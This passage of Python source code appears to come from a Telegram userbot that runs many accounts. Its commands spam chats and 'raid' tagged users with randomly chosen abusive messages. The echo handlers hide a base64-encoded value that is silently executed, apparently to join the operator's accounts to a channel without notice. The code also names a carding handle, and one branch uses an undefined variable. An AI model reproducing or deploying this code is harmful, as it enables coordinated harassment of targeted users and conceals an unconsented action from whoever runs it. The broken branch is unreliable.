                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(sleeptime)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )


@idk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
async def echo(event):
  usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}addecho <reply to a User>`"
  if event.sender_id in SUDO_USERS:
     if event.reply_to_msg_id is not None:
            reply_msg = await event.get_reply_message()
            user_id = reply_msg.sender_id
            if int(user_id) in RiZoeLX:
                    text = f"I can't echo @Carding_Chronicle"
                    await event.reply(text, parse_mode=None, link_preview=None )
            elif int(user_id) in SUDO_USERS:
                    text = f"This guy is a sudo user."
                    await event.reply(text, parse_mode=None, link_preview=None )
            else:
                 chat_id = event.chat_id
                 try:
                     hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
                     hmm = Get(hmm)
                     await event.client(hmm)
                 except BaseException:
                    pass
                 if is_echo(user_id, chat_id):
                     await event.reply("BHKK BSDK YEH PAHLE SE HI ECHO PE H ")
                     return
                 addecho(user_id, chat_id)
                 await event.reply("AB TU KUDH BOLEGA TERA BAAP KON H HEHE")
     else:
          await event.reply(usage)

@idk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
async def echo(event):
  usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}rmecho <reply to a User>`"
  if event.sender_id in SUDO_USERS:
     if event.reply_to_msg_id is not None:
            reply_msg = await event.get_reply_message()
            user_id = reply_msg.sender_id
            chat_id = event.chat_id
            try:
                hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
                hmm = Get(hmm)
                await event.client(hmm)
            except BaseException:
                pass
            if is_echo(user_id, chat_id):
                remove_echo(user_id, chat_id)
                await event.reply("ECHO BAND KAR  DI RE AB NA BOLEGA KUCH")
            else:
                await event.reply("CHAHATA H NA WAPIS ECHO NA  KARU TOH SORRY BOL SMAJHA")
     else:
          
            await event.reply(usage) 
            
            
@idk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.oword"))

async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 🇴🇳🇪  🇼🇴🇷🇩\n\nCommand:\n\n.oword <count> <Username of User>\n\n.oword <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            print(message)
            a = await e.client.get_entity(message)
            counter = int(yukki[0])
            for _ in range(counter):
                reply = random.choice(OWORD)
                caption = f"{reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            for _ in range(counter):
                reply = random.choice(OWORD)
                caption = f"{reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.1)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
            
@idk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))

async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗕𝗶𝗴𝗦𝗽𝗮𝗺\n\nCommand:\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            counter = int(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.1)
        elif e.reply_to_msg_id and smex.media:  
            counter = int(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex) 
                await asyncio.sleep(0.1)  
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.1)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
@idk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.raid"))

async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(yukki[0])
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(yukki[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.1)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
            
@idk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.mraid"))

async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗠𝗥𝗮𝗶𝗱\n\nCommand:\n\n.mraid <count> <Username of User>\n\n.mraid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(yukki[0])
            for _ in range(counter):
                reply = random.choice(MRAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(yukki[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(MRAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.1)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

@idk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.hraid"))

async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗠𝗥𝗮𝗶𝗱\n\nCommand:\n\n.hraid <count> <Username of User>\n\n.hraid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(yukki[0])
            for _ in range(counter):
                reply = random.choice(HRAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(yukki[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(HRAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.1)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )


@idk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.craid"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.craid"))

async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = C𝗥𝗮𝗶𝗱\n\nCommand:\n\n.craid <count> <Username of User>\n\n.craid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(yukki[0])
            for _ in range(counter):
                reply = random.choice(CRAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(yukki[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(CRAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.1)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )           
       
    
@idk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.sraid"))

async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗦𝗥𝗮𝗶𝗱\n\nCommand:\n\n.sraid <count> <Username of User>\n\n.sraid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(yukki[0])
            for _ in range(counter):
                reply = random.choice(SRAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(yukki[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(SRAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.1)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            

@idk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.sudo"))

async def tb(event):
    if event.sender_id in SMEX_USERS:
        ok = await event.reply("Adding user as a sudo...")
        KANISHKASPAM = "SUDO"
        if HEROKU_APP_NAME is not None:
            app = Heroku.app(HEROKU_APP_NAME)
        else:
            await ok.edit("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**")
            return
        heroku_var = app.config()
        if event is None:
            return
        try:
            target = await get_user(event)
        except Exception:
            await ok.edit(f"Reply to a user.")
        if sudousers:
            newsudo = f"{sudousers} {target}"
        else:
            newsudo = f"{target}"
        await ok.edit(f"**Added `{target}` ** as a sudo user 🔱 𝓚𝓐𝓡 𝓡𝓗𝓐 𝓐𝓓𝓓 𝓘𝓢𝓢 𝓒𝓗𝓞𝓜𝓤 𝓚𝓞 𝓢𝓤𝓓𝓞 𝓜𝓔 𝓡𝓤𝓚𝓞 𝓙𝓐𝓡𝓐")
        heroku_var[KANISHKASPAM] = newsudo

        

async def get_user(event):
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        if previous_message.forward:
            replied_user = await event.client(
                GetFullUserRequest(previous_message.forward.sender_id)
            )
